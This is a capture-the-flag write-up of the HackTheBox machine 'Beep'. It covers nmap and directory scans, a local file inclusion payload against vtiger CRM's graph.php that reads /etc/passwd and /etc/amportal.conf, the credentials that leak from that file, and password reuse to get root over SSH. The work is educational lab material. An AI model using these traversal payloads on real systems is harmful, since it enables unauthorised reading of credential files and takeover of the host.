---
title: "HTB - Beep"
categories: [box]
date: 2022-11-01
comments: true
image: /images/walkthroughs/hackthebox/beep/logo.png
favicon: /images/walkthroughs/hackthebox/beep/logo.png
description: HTB - Beep walkthrough
---

# Beep 

<p align="center">
  <img src="/images/walkthroughs/hackthebox/beep/banner.png" width="70%"/>
</p>

## Summary

Beep is a weird easy box where we have a SIP server (Asterisk) and checking the various software components, we find an LFI on elastix component. Using this LFI we can retreive the configuration file with several usernames and passwords. We can retreive the user flag from there.

Reusing those passwords we get into the machine as root and solved the box.


## Enumeration

- nmap

```bash
# Nmap 7.92 scan initiated Mon Dec  5 03:18:45 2022 as: nmap -sC -sV -p- -oA nmap 10.129.68.60
Nmap scan report for 10.129.68.60
Host is up (0.045s latency).
Not shown: 65519 closed tcp ports (conn-refused)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp?
|_smtp-commands: Couldn't establish connection on port 25'
80/tcp    open  http       Apache httpd 2.2.3
|_http-title: Did not follow redirect to https://10.129.68.60/
|_http-server-header: Apache/2.2.3 (CentOS)
110/tcp   open  pop3?
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            939/udp   status
|_  100024  1            942/tcp   status
143/tcp   open  imap?
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_imap-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_ssl-date: 2022-12-05T09:23:44+00:00; +59m59s from scanner time.
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Elastix - Login page
| http-robots.txt: 1 disallowed entry 
|_/
942/tcp   open  status     1 (RPC #100024)
993/tcp   open  imaps?
995/tcp   open  pop3s?
3306/tcp  open  mysql?
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_mysql-info: ERROR: Script execution failed (use -d to debug)
4190/tcp  open  sieve?
4445/tcp  open  upnotifyp?
4559/tcp  open  hylafax?
5038/tcp  open  asterisk   Asterisk Call Manager 1.1
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Host: 127.0.0.1
```

I had some issues with TLS 1.0 and gobuster, so I decided to go with Feroxbuster:

- Feroxbuster

```bash
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://10.129.68.60/
 🚀  Threads               │ 25
 📖  Wordlist              │ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 2
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET       10l       30w      289c https://10.129.68.60/.htaccess
200      GET       35l      111w     1785c https://10.129.68.60/
403      GET       10l       30w      284c https://10.129.68.60/.hta
403      GET       10l       30w      289c https://10.129.68.60/.htpasswd
301      GET        9l       28w      313c https://10.129.68.60/admin => https://10.129.68.60/admin/
403      GET       10l       30w      290c https://10.129.68.60/admin/.hta
403      GET       10l       30w      295c https://10.129.68.60/admin/.htaccess
403      GET       10l       30w      295c https://10.129.68.60/admin/.htpasswd
403      GET       10l       30w      288c https://10.129.68.60/cgi-bin/
403      GET       10l       30w      297c https://10.129.68.60/cgi-bin/.htaccess
403      GET       10l       30w      292c https://10.129.68.60/cgi-bin/.hta
403      GET       10l       30w      297c https://10.129.68.60/cgi-bin/.htpasswd
301      GET        9l       28w      315c https://10.129.68.60/configs => https://10.129.68.60/configs/
200      GET        1l        6w      894c https://10.129.68.60/favicon.ico
301      GET        9l       28w      320c https://10.129.68.60/admin/common => https://10.129.68.60/admin/common/
301      GET        9l       28w      312c https://10.129.68.60/help => https://10.129.68.60/help/
301      GET        9l       28w      314c https://10.129.68.60/images => https://10.129.68.60/images/
403      GET       10l       30w      294c https://10.129.68.60/help/.htaccess
403      GET       10l       30w      289c https://10.129.68.60/help/.hta
403      GET       10l       30w      294c https://10.129.68.60/help/.htpasswd
403      GET       10l       30w      296c https://10.129.68.60/images/.htaccess
403      GET       10l       30w      291c https://10.129.68.60/images/.hta
403      GET       10l       30w      296c https://10.129.68.60/images/.htpasswd
301      GET        9l       28w      312c https://10.129.68.60/lang => https://10.129.68.60/lang/
301      GET        9l       28w      312c https://10.129.68.60/libs => https://10.129.68.60/libs/
403      GET       10l       30w      294c https://10.129.68.60/lang/.htaccess
403      GET       10l       30w      289c https://10.129.68.60/lang/.hta
403      GET       10l       30w      294c https://10.129.68.60/lang/.htpasswd
301      GET        9l       28w      315c https://10.129.68.60/modules => https://10.129.68.60/modules/
301      GET        9l       28w      320c https://10.129.68.60/admin/images => https://10.129.68.60/admin/images/
301      GET        9l       28w      313c https://10.129.68.60/panel => https://10.129.68.60/panel/
403      GET       10l       30w      295c https://10.129.68.60/panel/.htaccess
403      GET       10l       30w      295c https://10.129.68.60/panel/.htpasswd
200      GET      196l     1149w     7421c https://10.129.68.60/panel/README
301      GET        9l       28w      320c https://10.129.68.60/help/content => https://10.129.68.60/help/content/
301      GET        9l       28w      324c https://10.129.68.60/modules/antispam => https://10.129.68.60/modules/antispam/
200      GET        2l        4w       28c https://10.129.68.60/robots.txt
301      GET        9l       28w      324c https://10.129.68.60/modules/calendar => https://10.129.68.60/modules/calendar/
```

Overall information from the nmap script, we see Asterisk, seems like it is a VoIP server.

From the feroxbuster, we can reveal several login websites:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/beep/1_0_web.png" width="80%"/>
</p>

<p align="center">
  <img src="/images/walkthroughs/hackthebox/beep/1_6_error.png" width="80%"/>
</p>

<p align="center">
  <img src="/images/walkthroughs/hackthebox/beep/1_8_login.png" width="80%"/>
</p>

<p align="center">
  <img src="/images/walkthroughs/hackthebox/beep/1_7_version.png" width="80%"/>
</p>

<p align="center">
  <img src="/images/walkthroughs/hackthebox/beep/1_9_login.png" width="80%"/>
</p>

<p align="center">
  <img src="/images/walkthroughs/hackthebox/beep/1_10_login.png" width="80%"/>
</p>

Versions and software:

- elastix
- vtiger CRM 5.1.0
- Webmin
- Roundcube
- FreePBX 2.8.1.4 
- FreePBX 2.5

This server may have a [LFI vulnerability](https://www.mageni.net/vulnerability/elastix-graphphp-local-file-include-vulnerability-103540), we don't know the version yet. Also the cgi-bin folder and the different set of them used in webmin (if we get stuck we might try shellshock).

We could locate the [LFI exploit](https://www.exploit-db.com/exploits/37637) and get response from the https://10.129.68.60/vtigercrm/graph.php endpoint, so let's test the complete payload:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/beep/1_5_lfi.png" width="70%"/>
</p>

It works, so retrieving the users might help:

https://10.129.68.60/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action

- /etc/passwd

```
root:x:0:0:root:/root:/bin/bash
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
apache:x:48:48:Apache:/var/www:/sbin/nologin
...
asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash
spamfilter:x:500:500::/home/spamfilter:/bin/bash
haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin
fanis:x:501:501::/home/fanis:/bin/bash
Sorry! Attempt to access restricted file.
```

We can see the user fanis, let's try to grab the user flag:

https://10.129.68.60/vtigercrm/graph.php?current_language=../../../../../../../..//home/fanis/user.txt%00&module=Accounts&action

<p align="center">
  <img src="/images/walkthroughs/hackthebox/beep/2_1_user.png" width="70%"/>
</p>

``` e7f581db465664d7b1dbba9d63169a29 ```

We get the flag so let's try to get an SSH key:

https://10.129.68.60/vtigercrm/graph.php?current_language=../../../../../../../..//home/fanis/.ssh/id_rsa%00&module=Accounts&action

We had no luck with that. I retrieved the configuration file at /etc/amportal.conf since it might contains secrets, and luckily it does:


https://10.129.68.60/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action


- /etc/amportal.conf

```
# FreePBX Database configuration
# AMPDBHOST: Hostname where the FreePBX database resides
# AMPDBENGINE: Engine hosting the FreePBX database (e.g. mysql)
# AMPDBNAME: Name of the FreePBX database (e.g. asterisk)
# AMPDBUSER: Username used to connect to the FreePBX database
# AMPDBPASS: Password for AMPDBUSER (above)
# AMPENGINE: Telephony backend engine (e.g. asterisk)
# AMPMGRUSER: Username to access the Asterisk Manager Interface
# AMPMGRPASS: Password for AMPMGRUSER
#
AMPDBHOST=localhost
AMPDBENGINE=mysql
# AMPDBNAME=asterisk
AMPDBUSER=asteriskuser
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE
```

**admin:jEhdIekWmdjE**

Using those credentials on the basic auth we get into the system:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/beep/2_0_in.png" width="90%"/>
</p>

Testing credential reuse, we find that it was used for the root user, so with SSH we can get into the box:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/beep/3_4_root.png" width="90%"/>
</p>